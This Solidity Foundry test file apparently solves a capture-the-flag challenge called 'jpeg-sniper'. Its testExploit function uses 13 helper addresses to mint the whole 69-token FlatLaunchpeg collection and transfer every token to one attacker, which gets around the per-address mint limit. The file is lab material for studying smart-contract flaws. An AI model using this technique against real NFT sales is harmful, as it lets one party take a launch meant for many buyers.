// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {FlatLaunchpeg} from "../../src/jpeg-sniper/FlatLaunchpeg.sol";

contract FlatLaunchpegTest is Test {
  uint256 private constant COLLECTION_SIZE = 69;
  uint256 private constant MAX_PER_ADDRESS_DURING_MINT = 5;

  Utilities private utils;
  address payable private attacker;
  address payable[] users;
  uint256 private startBlock;
  FlatLaunchpeg private flatLaunchpeg;

  function setUp() public {
    utils = new Utilities();

    users = utils.createUsers(14);
    attacker = users[0];
    vm.label(attacker, "Attacker");

    startBlock = block.number;

    flatLaunchpeg = new FlatLaunchpeg(COLLECTION_SIZE, MAX_PER_ADDRESS_DURING_MINT);
    vm.label(address(flatLaunchpeg), "FlatLaunchpeg");
  }

  function testExploit() public {
    // Exploit start

    vm.prank(attacker);
    flatLaunchpeg.publicSaleMint(MAX_PER_ADDRESS_DURING_MINT);

    for (uint256 userId = 1; userId < 14; ++userId) {
      vm.startPrank(users[userId]);

      uint256 qty = MAX_PER_ADDRESS_DURING_MINT;
      uint256 left = COLLECTION_SIZE - flatLaunchpeg.totalSupply();
      if (left < MAX_PER_ADDRESS_DURING_MINT) {
        qty = left;
      }

      flatLaunchpeg.publicSaleMint(qty);

      uint256 totalSupply = flatLaunchpeg.totalSupply();
      uint256 startTokenId = totalSupply - qty;

      for (uint256 tokenId = startTokenId; tokenId < totalSupply; ++tokenId) {
        flatLaunchpeg.transferFrom(users[userId], attacker, tokenId);
      }

      vm.stopPrank();
    }


    // Move forward by 1 block
    utils.mineBlocks(1);

    // Exploit end

    validate();
  }

  function validate() private {
    assertEq(flatLaunchpeg.totalSupply(), COLLECTION_SIZE);
    assertEq(flatLaunchpeg.balanceOf(attacker), COLLECTION_SIZE);
    assertEq(block.number, startBlock + 1);
  }
}
